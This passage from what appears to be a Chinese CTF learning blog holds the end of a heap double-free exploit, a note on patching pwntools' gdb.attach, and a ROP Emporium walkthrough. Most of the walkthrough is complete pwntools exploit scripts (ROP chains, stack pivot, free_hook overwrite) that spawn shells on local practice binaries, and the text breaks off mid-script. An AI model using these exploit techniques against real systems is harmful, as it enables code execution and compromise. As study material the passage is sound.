drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dbg</span><span class="hljs-params">()</span>:</span><span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript="b main")</span>gdb.attach(io)pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(length,contend)</span> :</span>    sla(<span class="hljs-string">'choice: '</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'length of message:\n'</span>,str(length))    sa(<span class="hljs-string">'message:\n'</span>,str(contend))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(index)</span>:</span>    sla(<span class="hljs-string">'choice: '</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'to delete:\n'</span>,str(index))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(index,contend)</span>:</span>    sla(<span class="hljs-string">'choice: '</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'to edit:\n'</span>,str(index))    sa(<span class="hljs-string">'the message:\n'</span>,str(contend))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(index)</span>:</span>    sla(<span class="hljs-string">'choice: '</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'to display:\n'</span>,str(index))add(<span class="hljs-number">0x30</span>,<span class="hljs-string">'a'</span>) <span class="hljs-comment">#0</span>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">'a'</span>) <span class="hljs-comment">#1</span>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">'a'</span>) <span class="hljs-comment">#2</span>free(<span class="hljs-number">1</span>)free(<span class="hljs-number">2</span>)free(<span class="hljs-number">1</span>)add(<span class="hljs-number">0x20</span>,p64(<span class="hljs-number">0x602068</span>))add(<span class="hljs-number">0x20</span>,<span class="hljs-string">'aaaaaaaa'</span>)add(<span class="hljs-number">0x20</span>,<span class="hljs-string">'aaaaaaaa'</span>)contend = p64(elf.got[<span class="hljs-string">'puts'</span>])<span class="hljs-comment"># + p64(0x30) + p64(elf.got['puts'])</span>add(<span class="hljs-number">0x20</span>,contend)show(<span class="hljs-number">0</span>)ru(<span class="hljs-string">' message: '</span>)puts = uu64(r(<span class="hljs-number">6</span>))libc_base = puts - libc.symbols[<span class="hljs-string">'puts'</span>]free_hook = libc_base + libc.symbols[<span class="hljs-string">'__free_hook'</span>]print(<span class="hljs-string">'puts'</span> + hex(puts))print(<span class="hljs-string">'libc_base'</span> + hex(libc_base))system = libc_base + libc.symbols[<span class="hljs-string">'system'</span>]contend = p64(free_hook)dbg()edit(<span class="hljs-number">6</span>,contend)<span class="hljs-comment"># dbg()</span>contend = p64(system)edit(<span class="hljs-number">0</span>,contend)<span class="hljs-comment"># dbg()</span>add(<span class="hljs-number">0x8</span>,<span class="hljs-string">'/bin/sh\x00'</span>)free(<span class="hljs-number">7</span>)itr()</code></pre></div>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>学习记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwntools的gdb.attach</title>
    <link href="/2020/04/20/pwntools%E7%9A%84gdb.attach/"/>
    <url>/2020/04/20/pwntools%E7%9A%84gdb.attach/</url>
    
    <content type="html"><![CDATA[<h1 id="pwntools的gdb-attach"><a href="#pwntools的gdb-attach" class="headerlink" title="pwntools的gdb.attach"></a>pwntools的gdb.attach</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在尝试学着更快的调试exp，很早就了解到这个gdb.attach，但是本人是ssh连上去的，根本用不了。然后尝试tmux这个神器，来实现gdb.attach。成功以后发现一个不好的点，pwntools gdb.attach上的gdb调试中，很多函数是没有符号表的，调试起来反而难度增加。<br><img src="http://qiqianyun.chumen77.xyz/uPic/QGWqDH.png" srcset="/img/loading.gif" alt><br>自己手动gdb.attach上去。<br><img src="http://qiqianyun.chumen77.xyz/uPic/acimnJ.png" srcset="/img/loading.gif" alt><br>然后发现谷歌也谷歌不出来，就来折腾源码了。<br><strong>版本号 ：pwntools (4.0.1)</strong></p><h2 id="改善"><a href="#改善" class="headerlink" title="改善"></a>改善</h2><p>因为正常本人都是</p><div class="hljs"><pre><code class="hljs undefined">chumen77<span class="hljs-variable">@chumen</span>-<span class="hljs-number">77</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>gdb at pid</code></pre></div><p>这样来进行attach。<br><img src="http://qiqianyun.chumen77.xyz/uPic/JxHuUC.png" srcset="/img/loading.gif" alt><br>发现用pwntools时候，它进行的命令是这样的，然后思路就来了找到相关源码，改一下就好了。</p><h3 id="找关键处"><a href="#找关键处" class="headerlink" title="找关键处"></a>找关键处</h3><div class="hljs"><pre><code class="hljs undefined">/running <span class="hljs-keyword">in</span> <span class="hljs-built_in">new</span> <span class="hljs-built_in">terminal</span></code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/8T9BqG.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/BlYHnW.png" srcset="/img/loading.gif" alt><br>删除2行和修改一行代码（<code>-q 改成 at</code>）即可。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/XUD2ZW.png" srcset="/img/loading.gif" alt><br>发现已经可以了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>杂项</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ropemporium 通关记录</title>
    <link href="/2020/04/13/Ropemporium%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/04/13/Ropemporium%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="Ropemporium-通关记录"><a href="#Ropemporium-通关记录" class="headerlink" title="Ropemporium 通关记录"></a>Ropemporium 通关记录</h1><h2 id="ret2win"><a href="#ret2win" class="headerlink" title="ret2win"></a>ret2win</h2><h3 id="保护和arch"><a href="#保护和arch" class="headerlink" title="保护和arch"></a>保护和arch</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span></code></pre></div><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><p>题目给了提示，32的buf却可以填充50个字节。并且接受用的是fgets，这个函数不用担心空字节。</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">ret2win</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Thank you! Here's your flag:"</span>);  <span class="hljs-keyword">return</span> system(<span class="hljs-string">"/bin/cat flag.txt"</span>);&#125;</code></pre></div><p>并且存在漏洞函数。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><h4 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.arch = <span class="hljs-string">'i386'</span>io = process(<span class="hljs-string">'./ret2win32'</span>)io.recvuntil(<span class="hljs-string">'&gt;'</span>)payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">44</span> + p32(<span class="hljs-number">0x08048659</span>)io.sendline(payload)io.interactive()</code></pre></div><h4 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.arch = <span class="hljs-string">'amd64'</span>io = process(<span class="hljs-string">'./ret2win'</span>)io.recvuntil(<span class="hljs-string">'&gt;'</span>)payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">40</span> + p64(<span class="hljs-number">0x00000400811</span>)io.sendline(payload)io.interactive()</code></pre></div><h2 id="split"><a href="#split" class="headerlink" title="split"></a>split</h2><h3 id="保护和arch-1"><a href="#保护和arch-1" class="headerlink" title="保护和arch"></a>保护和arch</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span></code></pre></div><h3 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h3><div class="hljs"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">usefulFunction</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-keyword">return</span> system(<span class="hljs-string">"/bin/ls"</span>);&#125;</code></pre></div><p>后门函数变成了这样，但是可以看到有cat flag的字符串。这样只需要控制system的参数即可。<br><img src="http://qiqianyun.chumen77.xyz/uPic/aPvOxL.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/qQOFlI.png" srcset="/img/loading.gif" alt></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><h4 id="32位："><a href="#32位：" class="headerlink" title="32位："></a>32位：</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.arch = <span class="hljs-string">'i386'</span>io = process(<span class="hljs-string">'./split32'</span>)key = <span class="hljs-number">0x0804A030</span> <span class="hljs-comment"># /bin/cat flag.txt'</span>io.recvuntil(<span class="hljs-string">'&gt;'</span>)offset = <span class="hljs-number">44</span>payload = <span class="hljs-string">'a'</span> * offset + p32(<span class="hljs-number">0x08048657</span>) + p32(<span class="hljs-number">0x0804A030</span>)raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(payload)io.interactive()</code></pre></div><h4 id="64位："><a href="#64位：" class="headerlink" title="64位："></a>64位：</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.arch = <span class="hljs-string">'amd64'</span>io = process(<span class="hljs-string">'./split'</span>)io.recvuntil(<span class="hljs-string">'&gt;'</span>)key = <span class="hljs-number">0x00601060</span> <span class="hljs-comment"># /bin/cat flag.txt'</span>offset = <span class="hljs-number">40</span>pop_rdi_ret = <span class="hljs-number">0x0000000000400883</span>payload = <span class="hljs-string">'a'</span> * offset + p64(pop_rdi_ret) + p64(key) + p64(<span class="hljs-number">0x00000400810</span>) io.sendline(payload)io.interactive()</code></pre></div><h2 id="callme"><a href="#callme" class="headerlink" title="callme"></a>callme</h2><h3 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h3><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">void</span> __<span class="hljs-function">noreturn <span class="hljs-title">usefulFunction</span><span class="hljs-params">()</span></span>&#123;  callme_three(<span class="hljs-number">4L</span>L, <span class="hljs-number">5L</span>L, <span class="hljs-number">6L</span>L);  callme_two(<span class="hljs-number">4L</span>L, <span class="hljs-number">5L</span>L, <span class="hljs-number">6L</span>L);  callme_one(<span class="hljs-number">4L</span>L, <span class="hljs-number">5L</span>L, <span class="hljs-number">6L</span>L);  <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);&#125;</code></pre></div><p>这个是关键函数，但是其是用到了给的so文件，然后ida来分析so文件。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/FgKhVy.png" srcset="/img/loading.gif" alt><br>找到以后发现应该是按照顺序调用<code>callme-one，callme-two，callme-three</code>需要注意其参数都要是1，2，3.当初程序中给的是4，5，6 需要想办法来换掉这个参数。</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><h4 id="32位：-1"><a href="#32位：-1" class="headerlink" title="32位："></a>32位：</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.arch = <span class="hljs-string">'i386'</span>io = process(<span class="hljs-string">'./callme32'</span>)io.recvuntil(<span class="hljs-string">'&gt;'</span>)offset = <span class="hljs-number">44</span>callme_one = <span class="hljs-number">0x080485C0</span>callme_two = <span class="hljs-number">0x08048620</span>callme_three = <span class="hljs-number">0x080485B0</span>pop3_ret = <span class="hljs-number">0x080488a9</span>payload = <span class="hljs-string">'a'</span> * offset + p32(callme_one) + p32(pop3_ret) + p32(<span class="hljs-number">1</span>) + p32(<span class="hljs-number">2</span>) + p32(<span class="hljs-number">3</span>)payload += p32(callme_two) + p32(pop3_ret) + p32(<span class="hljs-number">1</span>) + p32(<span class="hljs-number">2</span>) + p32(<span class="hljs-number">3</span>)payload += p32(callme_three) + p32(<span class="hljs-number">0xdeadbeef</span>) + p32(<span class="hljs-number">1</span>) + p32(<span class="hljs-number">2</span>) + p32(<span class="hljs-number">3</span>)raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(payload)io.interactive()</code></pre></div><p>其中<code>pop3_ret</code> 是用来保持栈平衡的，且站的位置函数的返回地址。还有需要注意的问题是：<br><img src="http://qiqianyun.chumen77.xyz/uPic/9PV8oL.png" srcset="/img/loading.gif" alt><br>注意填充以后的返回地址填的时候，通常填的是代码段的数据，但是这里汇编是<code>call</code>所以在填的时候，应该是填充其plt的地址。<br><img src="http://qiqianyun.chumen77.xyz/uPic/HxXaWe.png" srcset="/img/loading.gif" alt></p><h4 id="64位：-1"><a href="#64位：-1" class="headerlink" title="64位："></a>64位：</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.arch = <span class="hljs-string">'amd64'</span>io = process(<span class="hljs-string">'./callme'</span>)io.recvuntil(<span class="hljs-string">'&gt;'</span>)offset = <span class="hljs-number">40</span>callme_one = <span class="hljs-number">0x00401850</span>callme_two = <span class="hljs-number">0x000401870</span>callme_three = <span class="hljs-number">0x00401810</span>pop3_ret = <span class="hljs-number">0x0000000000401ab0</span>payload = <span class="hljs-string">'a'</span> * offset + p64(pop3_ret) + p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">2</span>) + p64(<span class="hljs-number">3</span>) + p64(callme_one)payload += p64(pop3_ret) + p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">2</span>) + p64(<span class="hljs-number">3</span>) + p64(callme_two)payload += p64(pop3_ret) + p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">2</span>) + p64(<span class="hljs-number">3</span>) + p64(callme_three)raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(payload)io.interactive()</code></pre></div><p>利用 <code>0x0000000000401ab0 : pop rdi ; pop rsi ; pop rdx ; ret</code>这个gadget来控制参数。</p><h2 id="write4"><a href="#write4" class="headerlink" title="write4"></a>write4</h2><h3 id="ida分析-3"><a href="#ida分析-3" class="headerlink" title="ida分析"></a>ida分析</h3><p>这个题跟前面第2题很像，但是就是没有给你<code>cat flag</code> 的字符串了。需要自己用程序的gadget来构造。思路也就是进行rop把<code>/bin/sh</code>往bss段上写,然后接着拿shell就好了。</p><div class="hljs"><pre><code class="hljs undefined">ROPgadget <span class="hljs-params">--binary</span> <span class="hljs-string">./write4</span> <span class="hljs-params">--only</span> <span class="hljs-string">"mov|pop|ret"</span></code></pre></div><p><strong>查好用的gadgets：</strong><br><img src="http://qiqianyun.chumen77.xyz/uPic/pY6tBk.png" srcset="/img/loading.gif" alt><br>利用这即可就可以了，32位的类似。</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><h4 id="32位：-2"><a href="#32位：-2" class="headerlink" title="32位："></a>32位：</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.arch = <span class="hljs-string">'i386'</span>io = process(<span class="hljs-string">'./write432'</span>)io.recvuntil(<span class="hljs-string">'&gt;'</span>)elf = ELF(<span class="hljs-string">'./write432'</span>)<span class="hljs-comment"># bin_sh = elf.search('/bin/cat').next()</span>offset = <span class="hljs-number">44</span>bss = <span class="hljs-number">0x804A06C</span><span class="hljs-number">-0x10</span>pop_edi_pop_ebp_ret = <span class="hljs-number">0x080486da</span>system = <span class="hljs-number">0x8048430</span>key = <span class="hljs-number">0x08048670</span> <span class="hljs-comment">#mov dword ptr [edi], ebp ; ret</span>payload = <span class="hljs-string">'a'</span> * offset + flat([pop_edi_pop_ebp_ret,bss,<span class="hljs-string">'sh\x00\x00'</span>,key,system,<span class="hljs-number">0xdeadbeef</span>,bss])raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(payload)io.interactive()</code></pre></div><h4 id="64位：-2"><a href="#64位：-2" class="headerlink" title="64位："></a>64位：</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.arch = <span class="hljs-string">'amd64'</span>io = process(<span class="hljs-string">'./write4'</span>)io.recvuntil(<span class="hljs-string">'&gt;'</span>)elf = ELF(<span class="hljs-string">'./write4'</span>)<span class="hljs-comment"># bin_sh = elf.search('/bin/cat').next()</span>offset = <span class="hljs-number">40</span>bss = <span class="hljs-number">0x601090</span><span class="hljs-number">-0x10</span>key1 = <span class="hljs-number">0x0000000000400820</span><span class="hljs-comment"># mov qword ptr [r14], r15 ; ret</span>key2 = <span class="hljs-number">0x0000000000400890</span><span class="hljs-comment"># pop r14 ; pop r15 ; ret</span>key3 = <span class="hljs-number">0x0000000000400893</span><span class="hljs-comment">#pop rdi ; ret</span>system = <span class="hljs-number">0x000004005E0</span>payload = <span class="hljs-string">'a'</span> * offset + flat([key2,bss,<span class="hljs-string">'/bin/sh\x00'</span>,key1,key3,bss,system])raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(payload)io.interactive()</code></pre></div><h2 id="badchars"><a href="#badchars" class="headerlink" title="badchars"></a>badchars</h2><h3 id="ida分析-4"><a href="#ida分析-4" class="headerlink" title="ida分析"></a>ida分析</h3><p>这个题目跟前一个write4十分的相似，但是其过滤了个别字符：<br><img src="http://qiqianyun.chumen77.xyz/uPic/C2HXoN.png" srcset="/img/loading.gif" alt><br>会将其替换为<code>0xEB</code>，个人解决办法就是在bss段写好被程序处理过的字符串后，在用xor的gadgets来重新改回来，为了便于利用，32位和64位都是构造<code>system(sh)</code>来拿的shell。<br>例子：<br><img src="http://qiqianyun.chumen77.xyz/uPic/4tnNv7.png" srcset="/img/loading.gif" alt><br>传过去的是<code>sh\x00\x00\x00\x00\x00\x00\x00</code> 到bss是这个情况，然后去找xor的gadget：<br><img src="http://qiqianyun.chumen77.xyz/uPic/4OvcwS.png" srcset="/img/loading.gif" alt><br>其中注意这是以一个byte来进行xor的，然后这个图xor的倒数第一条语句，**其中的是dh，这个是edx的高位。r14b是r14的低位也是一个byte的字节单位。<br>这个题目在gdb调试exp时会发现有比较便捷的办法。</p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><h4 id="32位：-3"><a href="#32位：-3" class="headerlink" title="32位："></a>32位：</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.arch = <span class="hljs-string">'i386'</span>io = process(<span class="hljs-string">'./badchars32'</span>)io.recvuntil(<span class="hljs-string">'&gt;'</span>)elf = ELF(<span class="hljs-string">'./badchars32'</span>)key1 = <span class="hljs-number">0x08048893</span><span class="hljs-comment"># mov dword ptr [edi], esi ; ret</span>key2 = <span class="hljs-number">0x08048899</span><span class="hljs-comment"># pop esi ; pop edi ; ret</span>key3 = <span class="hljs-number">0x08048461</span><span class="hljs-comment"># pop ebx ; ret</span>bss = <span class="hljs-number">0x804A06C</span><span class="hljs-number">-10</span>key4 = <span class="hljs-number">0x08048897</span><span class="hljs-comment"># pop ecx ; ret</span>key5 = <span class="hljs-number">0x08048890</span><span class="hljs-comment">#xor byte ptr [ebx], cl ; ret</span>sys = <span class="hljs-number">0x080484E0</span>offset = <span class="hljs-number">44</span>payload = <span class="hljs-string">'a'</span> * offset + flat([key2,<span class="hljs-string">'sh\x00\x00'</span>,bss,key1,key3,bss,key4,<span class="hljs-number">0x98</span>,key5,sys,<span class="hljs-number">0xdeadbeef</span>,bss])raw_input(<span class="hljs-string">"-&gt;"</span>)io.sendline(payload)io.interactive()</code></pre></div><h4 id="64位：-3"><a href="#64位：-3" class="headerlink" title="64位："></a>64位：</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.arch = <span class="hljs-string">'amd64'</span>io = process(<span class="hljs-string">'./badchars'</span>)io.recvuntil(<span class="hljs-string">'&gt;'</span>)elf = ELF(<span class="hljs-string">'./badchars'</span>)offset = <span class="hljs-number">40</span>bss = <span class="hljs-number">0x6010B0</span>key1 = <span class="hljs-number">0x0000000000400b34</span><span class="hljs-comment"># mov qword ptr [r13], r12 ; ret</span>key2 = <span class="hljs-number">0x0000000000400b3b</span><span class="hljs-comment"># pop r12 ; pop r13 ; ret</span>key3 = <span class="hljs-number">0x0000000000400b39</span><span class="hljs-comment">#pop rdi ; ret</span>key4 = <span class="hljs-number">0x0000000000400b30</span><span class="hljs-comment">#xor byte ptr [r15], r14b ; ret</span>key5 = <span class="hljs-number">0x0000000000400b40</span><span class="hljs-comment">#pop r14 ; pop r15 ; ret</span>system = <span class="hljs-number">0x004006F0</span>payload = <span class="hljs-string">'a'</span> * offset + flat([key2,<span class="hljs-string">'sh\x00\x00\x00\x00\x00\x00'</span>,bss,key1,key5,<span class="hljs-number">0x98</span>,bss,key4,key3,bss,system])raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(payload)io.interactive()</code></pre></div><h2 id="fluff"><a href="#fluff" class="headerlink" title="fluff"></a>fluff</h2><p>这个题目还是跟write4很相似，但是找可用的gadget是，比较难找。需要想尽办法找各种gadget，然后叠加在一起成为需要的链。这个题突破口也就在：</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ecx</span>], <span class="hljs-built_in">edx</span> <span class="hljs-comment">; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret</span></code></pre></div><p>然后再去找ecx，edx相关的gadget，里面用到了xor和xchg等相关的gadget。<br>其中64位的找可用gadget，还需要控制一下深度：</p><div class="hljs"><pre><code class="hljs undefined">ROPgadget <span class="hljs-params">--binary</span> <span class="hljs-string">./fluff</span> <span class="hljs-params">--depth</span> 15</code></pre></div><p>这样找出足够的gadget，以便自己试用。</p><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><h4 id="32位：-4"><a href="#32位：-4" class="headerlink" title="32位："></a>32位：</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.arch = <span class="hljs-string">'i386'</span>io = process(<span class="hljs-string">'./fluff32'</span>)io.recvuntil(<span class="hljs-string">'&gt;'</span>)elf = ELF(<span class="hljs-string">'./fluff32'</span>)key1 = <span class="hljs-number">0x080483e1</span><span class="hljs-comment"># pop ebx ; ret</span>key2 = <span class="hljs-number">0x08048671</span><span class="hljs-comment"># xor edx, edx ; pop esi ; mov ebp, 0xcafebabe ; ret</span>key3 = <span class="hljs-number">0x0804867b</span><span class="hljs-comment"># xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; ret</span>bss = <span class="hljs-number">0x804A06C</span>key4 = <span class="hljs-number">0x08048689</span><span class="hljs-comment">#xchg edx, ecx ; pop ebp ; mov edx, 0xdefaced0 ; ret</span>key5 = <span class="hljs-number">0x08048693</span><span class="hljs-comment"># mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret</span>sys = <span class="hljs-number">0x8048430</span>offset = <span class="hljs-number">44</span>payload = <span class="hljs-string">'a'</span> * offset + flat([key1,bss,key2,<span class="hljs-number">1</span>,key3,<span class="hljs-number">1</span>,key4,<span class="hljs-number">1</span>,key1,<span class="hljs-string">'sh\x00\x00'</span>,key2,<span class="hljs-number">1</span>,key3,<span class="hljs-number">1</span>,key5,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,sys,<span class="hljs-number">0xdeadbeef</span>,bss])raw_input(<span class="hljs-string">"-&gt;"</span>)io.sendline(payload)io.interactive()</code></pre></div><h4 id="64位：-4"><a href="#64位：-4" class="headerlink" title="64位："></a>64位：</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.arch = <span class="hljs-string">'amd64'</span>io = process(<span class="hljs-string">'./fluff'</span>)io.recvuntil(<span class="hljs-string">'&gt;'</span>)elf = ELF(<span class="hljs-string">'./fluff'</span>)key1 = <span class="hljs-number">0x0000000000400832</span><span class="hljs-comment"># pop r12 ; mov r13d, 0x604060 ; ret</span>key2 = <span class="hljs-number">0x0000000000400822</span><span class="hljs-comment">#xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret</span>key3 = <span class="hljs-number">0x000000000040082f</span><span class="hljs-comment">#xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret</span>bss = <span class="hljs-number">0x601090</span>key4 = <span class="hljs-number">0x0000000000400840</span><span class="hljs-comment">##  : xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret</span>key5 = <span class="hljs-number">0x000000000040084e</span><span class="hljs-comment"># mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret</span>key6 = <span class="hljs-number">0x00000000004008c3</span><span class="hljs-comment"># pop rdi ; ret</span>sys = <span class="hljs-number">0x4005E0</span>offset = <span class="hljs-number">40</span>payload = <span class="hljs-string">'a'</span> * offset + flat([key1,bss,key2,<span class="hljs-number">1</span>,key3,<span class="hljs-number">1</span>,key4,<span class="hljs-number">1</span>,key1,<span class="hljs-string">'/bin/sh\x00'</span>,key2,<span class="hljs-number">1</span>,key3,<span class="hljs-number">1</span>,key5,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,key6,bss,sys])raw_input(<span class="hljs-string">"-&gt;"</span>)io.sendline(payload)io.interactive()</code></pre></div><h2 id="pivot"><a href="#pivot" class="headerlink" title="pivot"></a>pivot</h2><p>这个题一看就是栈转移了。</p><h3 id="ida分析-5"><a href="#ida分析-5" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/zf6UXd.png" srcset="/img/loading.gif" alt><br>可以看到会给你泄漏一个堆地址，给你去栈转移。<br>接着看后门函数，发现这里call一个与libc连接的函数：<br><img src="http://qiqianyun.chumen77.xyz/uPic/rdxJnU.png" srcset="/img/loading.gif" alt></p><p>接着分析一下给定的so文件：<br><img src="http://qiqianyun.chumen77.xyz/uPic/BkFCTM.png" srcset="/img/loading.gif" alt></p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">void</span> __<span class="hljs-function">noreturn <span class="hljs-title">ret2win</span><span class="hljs-params">()</span></span>&#123;  system(<span class="hljs-string">"/bin/cat flag.txt"</span>);  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);&#125;</code></pre></div><p>接着就有思路了，栈转移到给你的堆地址上，然后构造rop链：</p><ul><li>leak <code>foothold_function_got</code></li><li>算出给的libc基址，回到start，再次利用漏洞</li><li>构造jmp到ret2win的链即可<br>但是这个题目还是有技巧的，发现给你的堆地址其实跟这个libc的内存映射是很近的，并且每次差距也是固定的。那就可以直接分析so文件，来算取偏移，直接利用。</li></ul><p>根据给的堆地址和so文件映射基址：<br><img src="http://qiqianyun.chumen77.xyz/uPic/6yPkYR.png" srcset="/img/loading.gif" alt></p><h3 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3><h4 id="32位：-5"><a href="#32位：-5" class="headerlink" title="32位："></a>32位：</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.arch = <span class="hljs-string">'i386'</span>context.log_level = <span class="hljs-string">'debug'</span>io = process(<span class="hljs-string">'./pivot32'</span>)elf = ELF(<span class="hljs-string">'./pivot32'</span>)libc = ELF(<span class="hljs-string">'./libpivot32.so'</span>)foothold_function_plt = elf.plt[<span class="hljs-string">'foothold_function'</span>]foothold_function_got = elf.got[<span class="hljs-string">'foothold_function'</span>]put_plt = elf.plt[<span class="hljs-string">'puts'</span>]key1 = <span class="hljs-number">0x080486a8</span> <span 